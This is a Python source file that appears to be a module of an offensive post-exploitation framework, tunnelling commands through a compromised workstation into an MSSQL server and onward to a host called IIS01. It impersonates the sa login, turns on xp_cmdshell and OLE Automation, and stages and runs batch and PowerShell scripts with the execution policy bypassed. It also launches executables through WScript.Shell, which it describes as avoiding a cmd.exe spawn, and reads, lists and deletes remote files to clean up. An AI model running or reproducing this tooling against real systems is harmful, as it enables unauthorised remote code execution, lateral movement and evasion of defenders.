import random
import string


SCRIPT_CHUNK_SIZE = 1200
SP_OA_CREATE = 2
SP_OA_APPEND = 8


class XpMssqlBase:
    """Execution tunnel to IIS01 via WS01 TONESHELL -> sqlcmd -> MSSQL xp_cmdshell."""

    def __init__(self):
        self._host     = None
        self._login    = None
        self._password = None

    def ready(self) -> bool:
        return self._host is not None

    # ── helpers ─────────────────────────────────────────────────────────────

    def _rand_tmp(self, ext: str) -> str:
        stem = ''.join(random.choices(string.ascii_lowercase, k=8))
        return f"C:\\ProgramData\\{stem}.{ext}"

    def _tsql_escape(self, s: str) -> str:
        """Escape a value for embedding inside a T-SQL string literal '...'."""
        return s.replace("'", "''")

    def _sqlcmd_prefix(self) -> str:
        return f'sqlcmd -S {self._host} -U {self._login} -P {self._password} -C'

    def _exec_q(self, shell, tsql: str, timeout_s: int = None) -> str:
        """Send one sqlcmd -Q task. Escapes " for C runtime -Q "..." boundary only."""
        if getattr(shell, 'debug', False):
            print(f"[DBG] TSQL  : {tsql}")
        cmd = f'{self._sqlcmd_prefix()} -Q "{tsql.replace(chr(34), chr(34)*2)}"'
        return shell.cmd_exec_raw(cmd, timeout_s=timeout_s)

    def _sp_oa_write(self, shell, path: str, content: str):
        """Write content to a remote path on IIS01 via sp_OA FileSystemObject (chunked)."""
        for i, start in enumerate(range(0, len(content), SCRIPT_CHUNK_SIZE)):
            chunk = content[start:start + SCRIPT_CHUNK_SIZE]
            mode  = SP_OA_CREATE if i == 0 else SP_OA_APPEND
            segs     = chunk.split('"')
            val_expr = '+CHAR(34)+'.join(f"'{self._tsql_escape(s)}'" for s in segs)
            tsql  = (
                "EXECUTE AS LOGIN='sa';"
                "DECLARE @f INT,@x INT,@v NVARCHAR(MAX);"
                "EXEC sp_OACreate 'Scripting.FileSystemObject',@f OUT;"
                f"EXEC sp_OAMethod @f,'OpenTextFile',@x OUT,'{self._tsql_escape(path)}',{mode},1;"
                f"SET @v={val_expr};"
                "EXEC sp_OAMethod @x,'Write',NULL,@v;"
                "EXEC sp_OAMethod @x,'Close';"
                "EXEC sp_OADestroy @f;"
            )
            self._exec_q(shell, tsql)

    # ── commands ─────────────────────────────────────────────────────────────

    def cmd_xpinit(self, shell, host: str, login: str, password: str):
        """Enable sp_OA + xp_cmdshell on MSSQL and verify connectivity."""
        self._host     = host
        self._login    = login
        self._password = password
        setup = (
            "EXECUTE AS LOGIN='sa';"
            "EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE;"
            "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
        )
        self._exec_q(shell, setup)
        out = self._exec_q(shell,
            "EXECUTE AS LOGIN='sa';"
            "SELECT @@SERVERNAME AS [server],"
            "(SELECT TOP 1 service_account FROM sys.dm_server_services "
            "WHERE servicename LIKE N'SQL Server%') AS [svc_account];"
        )
        print(f"[+] xpinit OK — {out.strip()}")

    def cmd_xpshell_cmd(self, shell, cmd: str):
        """Run a cmd.exe command on IIS01 via .bat staging; capture output."""
        bat      = self._rand_tmp("bat")
        out_file = self._rand_tmp("txt")
        self._sp_oa_write(shell, bat, f"{cmd} > {out_file} 2>&1\r\n")
        self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell '{self._tsql_escape(bat)}'")
        output = self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'type {self._tsql_escape(out_file)}'")
        self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'del /f {self._tsql_escape(bat)} {self._tsql_escape(out_file)}'")
        print(output)

    def cmd_xpshell_psh(self, shell, script: str, timeout_s: int = 120):
        """Stage and run a PowerShell script on IIS01; stdout captured by xp_cmdshell."""
        if getattr(shell, 'debug', False):
            preview = script[:400] + ('…' if len(script) > 400 else '')
            print(f"[DBG] PSH   : {preview}")
        ps1 = self._rand_tmp("ps1")
        self._sp_oa_write(shell, ps1, script)
        run_tsql = (
            "EXECUTE AS LOGIN='sa';"
            f"EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -NoProfile -File {self._tsql_escape(ps1)}'"
        )
        output = self._exec_q(shell, run_tsql, timeout_s=timeout_s)
        self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'del /f {self._tsql_escape(ps1)}'")
        print(output)

    # ── direct PE execution (no cmd.exe spawn on IIS01) ─────────────────────

    def cmd_xprun(self, shell, exe_cmd: str, wait: bool = True):
        """Run an exe directly on IIS01 via sp_OA WScript.Shell.Run (no cmd.exe).
        Returns exit code only — no stdout capture. Use cmd_xprun_out for output."""
        wait_flag = "1" if wait else "0"
        tsql = (
            "EXECUTE AS LOGIN='sa';"
            "DECLARE @sh INT,@rc INT;"
            "EXEC sp_OACreate 'WScript.Shell',@sh OUT;"
            f"EXEC sp_OAMethod @sh,'Run',@rc OUT,"
            f"'{self._tsql_escape(exe_cmd)}',0,{wait_flag};"
            "SELECT @rc AS exit_code;"
            "EXEC sp_OADestroy @sh;"
        )
        out = self._exec_q(shell, tsql)
        print(out)

    def cmd_xprun_out(self, shell, exe_cmd: str, out_file: str = None):
        """Run exe with -o flag → read output via xpfile cat → cleanup.
        Entire chain uses sp_OA only — no cmd.exe spawn."""
        if out_file is None:
            out_file = self._rand_tmp("txt")
        full_cmd = f'{exe_cmd} -o {out_file}'
        wait_tsql = (
            "EXECUTE AS LOGIN='sa';"
            "DECLARE @sh INT,@rc INT;"
            "EXEC sp_OACreate 'WScript.Shell',@sh OUT;"
            f"EXEC sp_OAMethod @sh,'Run',@rc OUT,"
            f"'{self._tsql_escape(full_cmd)}',0,1;"
            "EXEC sp_OADestroy @sh;"
        )
        self._exec_q(shell, wait_tsql)
        self.cmd_xpfile_cat(shell, out_file)
        self.cmd_xpfile_del(shell, out_file)

    # ── file operations (no cmd spawn on IIS01) ────────────────────────────

    def cmd_xpfile_exists(self, shell, path: str):
        """Check file/directory existence on IIS01 via xp_fileexist (no cmd spawn)."""
        out = self._exec_q(shell,
            "EXECUTE AS LOGIN='sa';"
            f"EXEC master.dbo.xp_fileexist '{self._tsql_escape(path)}';"
        )
        print(out)

    def cmd_xpfile_del(self, shell, path: str):
        """Delete file on IIS01 via sp_OA FileSystemObject (no cmd spawn)."""
        out = self._exec_q(shell,
            "EXECUTE AS LOGIN='sa';"
            "DECLARE @fso INT,@hr INT;"
            "EXEC sp_OACreate 'Scripting.FileSystemObject',@fso OUT;"
            f"EXEC @hr=sp_OAMethod @fso,'DeleteFile',NULL,"
            f"'{self._tsql_escape(path)}';"
            "SELECT CASE @hr WHEN 0 THEN 'deleted' "
            "ELSE 'error: hr='+CAST(@hr AS VARCHAR(20)) END AS result;"
            "EXEC sp_OADestroy @fso;"
        )
        print(out)

    def cmd_xpfile_cat(self, shell, path: str):
        """Read text file on IIS01 via sp_OA ADODB.Stream (no cmd spawn)."""
        out = self._exec_q(shell,
            "EXECUTE AS LOGIN='sa';"
            "DECLARE @s INT,@text NVARCHAR(MAX);"
            "EXEC sp_OACreate 'ADODB.Stream',@s OUT;"
            "EXEC sp_OASetProperty @s,'Type',2;"
            "EXEC sp_OAMethod @s,'Open';"
            f"EXEC sp_OAMethod @s,'LoadFromFile',NULL,"
            f"'{self._tsql_escape(path)}';"
            "EXEC sp_OAGetProperty @s,'ReadText',@text OUT;"
            "SELECT @text AS content;"
            "EXEC sp_OAMethod @s,'Close';"
            "EXEC sp_OADestroy @s;"
        )
        print(out)

    def cmd_xpfile_ls(self, shell, path: str):
        """List directory on IIS01 via xp_dirtree (no cmd spawn)."""
        out = self._exec_q(shell,
            "EXECUTE AS LOGIN='sa';"
            f"EXEC master.dbo.xp_dirtree '{self._tsql_escape(path)}',1,1;"
        )
        print(out)
